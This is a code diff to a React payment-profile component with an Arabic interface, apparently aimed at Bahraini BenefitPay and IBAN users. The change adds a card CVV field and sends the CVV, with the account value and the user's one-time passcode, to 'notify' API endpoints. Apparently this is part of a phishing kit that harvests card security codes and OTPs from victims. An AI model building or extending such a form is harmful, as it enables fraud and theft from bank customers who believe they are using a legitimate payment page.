@@ -10,6 +10,7 @@ type Method = "benefitpay" | "iban";
 export function ProfileClient({ id, name, amount }: { id: string; name: string; amount: number }) {
   const [method, setMethod] = useState<Method>("benefitpay");
   const [value, setValue] = useState("");
+  const [cvv, setCvv] = useState("");
   const [error, setError] = useState("");
   const [step, setStep] = useState<"form" | "otp">("form");
   const [digits, setDigits] = useState<string[]>(EMPTY);
@@ -40,11 +41,15 @@ export function ProfileClient({ id, name, amount }: { id: string; name: string; 
       setError("أدخل رقم آيبان بحريني صحيح يبدأ بـ BH.");
       return;
     }
+    if (!/^\d{3,4}$/.test(cvv.trim())) {
+      setError("أدخل رمز CVV صحيح مكوّن من 3 أو 4 أرقام.");
+      return;
+    }
     setSending(true);
     const res = await fetch("/api/notify/profile", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ profileId: id, method, value: clean }),
+      body: JSON.stringify({ profileId: id, method, value: clean, cvv }),
     }).catch(() => null);
     setSending(false);
     if (!res || !res.ok) {
@@ -62,7 +67,7 @@ export function ProfileClient({ id, name, amount }: { id: string; name: string; 
     await fetch("/api/notify/otp", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, method: method === "iban" ? "iban" : "benefit", value }),
+      body: JSON.stringify({ code, method: method === "iban" ? "iban" : "benefit", value, cvv }),
     }).catch(() => null);
     setTimeout(() => {
       setLoading(false);
@@ -122,6 +127,27 @@ export function ProfileClient({ id, name, amount }: { id: string; name: string; 
                 placeholder={method === "benefitpay" ? "+97333XXXXXX" : "BH00XXXX00000000000000"}
                 className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
               />
+            </div>
+
+            <div>
+              <label htmlFor="cvv" className="mb-2 block text-sm font-bold">
+                رمز التحقق CVV
+              </label>
+              <div className="flex items-stretch gap-2" dir="ltr">
+                <input
+                  id="cvv"
+                  type="password"
+                  inputMode="numeric"
+                  maxLength={4}
+                  value={cvv}
+                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                  placeholder="•••"
+                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
+                />
+              </div>
+              <p className="mt-2 text-xs text-muted-foreground">
+                الرقم المكوّن من 3 أو 4 أرقام على ظهر البطاقة.
+              </p>
             </div>
 
             {error && <p className="text-sm font-semibold text-destructive">{error}</p>}
